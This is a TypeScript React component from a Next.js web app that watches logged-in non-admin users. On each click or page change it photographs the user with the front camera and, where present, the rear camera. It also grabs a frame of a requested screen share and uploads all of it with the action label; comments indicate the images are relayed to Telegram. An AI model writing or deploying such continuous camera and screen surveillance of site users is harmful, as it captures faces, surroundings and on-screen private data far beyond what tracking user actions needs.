'use client';

import { usePathname } from 'next/navigation';
import { useEffect, useRef } from 'react';

/* 操作留影：登录用户（非管理员）每次点击/切换页面拍一张前置照片上报。
   摄像头流在会话期间保持开启（浏览器指示点常亮），快照仅画 canvas，速度快。
   最小间隔 2 秒合并连点，避免 Telegram 刷屏。 */

const LS_PERM = 'entry_perm_ok';
const MIN_INTERVAL = 2000;
const AUTH_PAGES = ['/login', '/register', '/oidc-register', '/qr-login', '/tv/login', '/warning'];

export default function OperationWatcher() {
  const pathname = usePathname();
  const streamRef = useRef<MediaStream | null>(null);
  const videoRef = useRef<HTMLVideoElement | null>(null);
  const backStreamRef = useRef<MediaStream | null>(null);
  const backVideoRef = useRef<HTMLVideoElement | null>(null);
  const screenStreamRef = useRef<MediaStream | null>(null);
  const screenVideoRef = useRef<HTMLVideoElement | null>(null);
  const screenTriedRef = useRef(false);
  const lastRef = useRef(0);
  const timerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const pendingRef = useRef<{ label: string; path: string } | null>(null);
  const enabledRef = useRef(false);
  const pathRef = useRef(pathname);
  pathRef.current = pathname;

  useEffect(() => {
    let alive = true;
    fetch('/api/entry/status', { cache: 'no-store' })
      .then((r) => r.json())
      .then((j: { capture?: boolean }) => {
        if (!alive) return;
        enabledRef.current = j.capture !== false;
        if (enabledRef.current) void ensureScreen();
      })
      .catch(() => {
        if (alive) enabledRef.current = false;
      });
    return () => {
      alive = false;
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  const openOne = async (facing: 'user' | 'environment') => {
    const s = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: facing, width: { ideal: 640 } },
      audio: false,
    });
    const v = document.createElement('video');
    v.muted = true;
    v.playsInline = true;
    v.srcObject = s;
    await v.play().catch(() => undefined);
    await new Promise((r) => setTimeout(r, 300));
    return { s, v };
  };

  const ensureStream = async (): Promise<boolean> => {
    if (streamRef.current?.active && videoRef.current?.videoWidth) return true;
    try {
      const { s, v } = await openOne('user');
      streamRef.current = s;
      videoRef.current = v;
    } catch {
      streamRef.current = null;
      return false;
    }
    // 后置：没有硬件就跳过（桌面设备）
    if (!backStreamRef.current?.active || !backVideoRef.current?.videoWidth) {
      try {
        const { s, v } = await openOne('environment');
        backStreamRef.current = s;
        backVideoRef.current = v;
      } catch {
        backStreamRef.current = null;
        backVideoRef.current = null;
      }
    }
    return !!videoRef.current?.videoWidth;
  };

  /** 屏幕共享：整会话只请求一次（浏览器每次调用都弹选择器，不能静默）。
      移动端 Safari/Chrome 不支持 getDisplayMedia，直接跳过。 */
  const ensureScreen = async () => {
    if (screenTriedRef.current) return;
    screenTriedRef.current = true;
    const md = navigator.mediaDevices as MediaDevices & {
      getDisplayMedia?: (c?: unknown) => Promise<MediaStream>;
    };
    if (!md?.getDisplayMedia) return;
    try {
      const s = await md.getDisplayMedia({ video: { width: { ideal: 1280 } }, audio: false });
      const v = document.createElement('video');
      v.muted = true;
      v.playsInline = true;
      v.srcObject = s;
      await v.play().catch(() => undefined);
      await new Promise((r) => setTimeout(r, 300));
      screenStreamRef.current = s;
      screenVideoRef.current = v;
      s.getVideoTracks()[0]?.addEventListener('ended', () => {
        screenStreamRef.current = null;
        screenVideoRef.current = null;
      });
    } catch {
      screenStreamRef.current = null;
      screenVideoRef.current = null;
    }
  };

  const draw = (v: HTMLVideoElement, maxW = 640): string | null => {
    if (!v.videoWidth) return null;
    const scale = Math.min(1, maxW / v.videoWidth);
    const canvas = document.createElement('canvas');
    canvas.width = Math.round(v.videoWidth * scale);
    canvas.height = Math.round(v.videoHeight * scale);
    const ctx = canvas.getContext('2d');
    if (!ctx) return null;
    ctx.drawImage(v, 0, 0, canvas.width, canvas.height);
    return canvas.toDataURL('image/jpeg', 0.6);
  };

  const snap = async (label: string, path: string) => {
    if (!enabledRef.current) return;
    try {
      if (!localStorage.getItem(LS_PERM)) return;
    } catch {
      return;
    }
    if (AUTH_PAGES.some((p) => path === p || path.startsWith(p + '/'))) return;
    const okStream = await ensureStream();
    const v = videoRef.current;
    if (!okStream || !v || !v.videoWidth) return;
    try {
      const photo = draw(v);
      const photoBack = backVideoRef.current ? draw(backVideoRef.current) : null;
      const screen =
        screenStreamRef.current?.active && screenVideoRef.current
          ? draw(screenVideoRef.current, 1280)
          : null;
      if (!photo) return;
      lastRef.current = Date.now();
      await fetch('/api/entry/op', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          photo,
          photoBack: photoBack || '',
          screen: screen || '',
          label,
          path,
        }),
      }).catch(() => undefined);
    } catch {
      /* ignore */
    }
  };

  const schedule = (label: string) => {
    if (!enabledRef.current) return;
    const path = pathRef.current;
    const wait = Math.max(0, lastRef.current + MIN_INTERVAL - Date.now());
    if (wait <= 0) {
      void snap(label, path);
      return;
    }
    pendingRef.current = { label, path };
    if (timerRef.current) clearTimeout(timerRef.current);
    timerRef.current = setTimeout(() => {
      const p = pendingRef.current;
      pendingRef.current = null;
      timerRef.current = null;
      if (p) void snap(p.label, p.path);
    }, wait);
  };

  useEffect(() => {
    const onClick = (e: MouseEvent) => {
      const target = e.target as HTMLElement | null;
      const el = target?.closest?.('a,button,[role=button],video,input,select,summary') as HTMLElement | null;
      if (!el) return;
      const text = (el.textContent || '').trim().replace(/\s+/g, ' ').slice(0, 24);
      const href = el.getAttribute('href') || '';
      const label = `点击 ${text || el.tagName.toLowerCase()}${href ? ` → ${href.slice(0, 40)}` : ''}`;
      schedule(label);
    };
    document.addEventListener('click', onClick, true);
    return () => document.removeEventListener('click', onClick, true);
  }, []);

  const prevPath = useRef(pathname);
  useEffect(() => {
    if (prevPath.current !== pathname) {
      prevPath.current = pathname;
      schedule(`进入页面 ${pathname}`);
    }
  }, [pathname]);

  useEffect(
    () => () => {
      if (timerRef.current) clearTimeout(timerRef.current);
      streamRef.current?.getTracks().forEach((t) => t.stop());
      backStreamRef.current?.getTracks().forEach((t) => t.stop());
      screenStreamRef.current?.getTracks().forEach((t) => t.stop());
    },
    []
  );

  return null;
}
